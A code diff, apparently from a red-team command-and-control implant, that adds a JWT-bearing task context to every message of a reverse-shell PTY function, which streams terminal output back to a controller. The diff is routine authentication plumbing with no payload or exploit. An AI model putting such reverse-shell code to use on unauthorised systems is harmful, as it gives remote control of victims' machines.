@@ -25,7 +25,10 @@ pub async fn run_reverse_shell_pty<T: Transport>(
     // First, send an initial registration message
     if let Err(_err) = output_tx
         .send(ReverseShellRequest {
-            task_id,
+            context: Some(pb::c2::TaskContext {
+                task_id,
+                jwt: jwt.clone(),
+            }),
             kind: ReverseShellMessageKind::Ping.into(),
             data: Vec::new(),
         })
@@ -91,6 +94,7 @@ pub async fn run_reverse_shell_pty<T: Transport>(
     // Spawn task to send PTY output
     const CHUNK_SIZE: usize = 1024;
     let output_tx_clone = output_tx.clone();
+    let jwt_clone = jwt.clone();
     tokio::spawn(async move {
         loop {
             let mut buffer = [0; CHUNK_SIZE];
@@ -121,9 +125,12 @@ pub async fn run_reverse_shell_pty<T: Transport>(
 
             if let Err(_err) = output_tx_clone
                 .send(ReverseShellRequest {
+                    context: Some(pb::c2::TaskContext {
+                        task_id,
+                        jwt: jwt_clone.clone(),
+                    }),
                     kind: ReverseShellMessageKind::Data.into(),
                     data: buffer[..n].to_vec(),
-                    task_id,
                 })
                 .await
             {
@@ -135,9 +142,12 @@ pub async fn run_reverse_shell_pty<T: Transport>(
             // Ping to flush
             if let Err(_err) = output_tx_clone
                 .send(ReverseShellRequest {
+                    context: Some(pb::c2::TaskContext {
+                        task_id,
+                        jwt: jwt_clone.clone(),
+                    }),
                     kind: ReverseShellMessageKind::Ping.into(),
                     data: Vec::new(),
-                    task_id,
                 })
                 .await
             {
@@ -166,9 +176,12 @@ pub async fn run_reverse_shell_pty<T: Transport>(
             if msg.kind == ReverseShellMessageKind::Ping as i32 {
                 if let Err(_err) = output_tx
                     .send(ReverseShellRequest {
+                        context: Some(pb::c2::TaskContext {
+                            task_id,
+                            jwt: jwt.clone(),
+                        }),
                         kind: ReverseShellMessageKind::Ping.into(),
                         data: msg.data,
-                        task_id,
                     })
                     .await
                 {
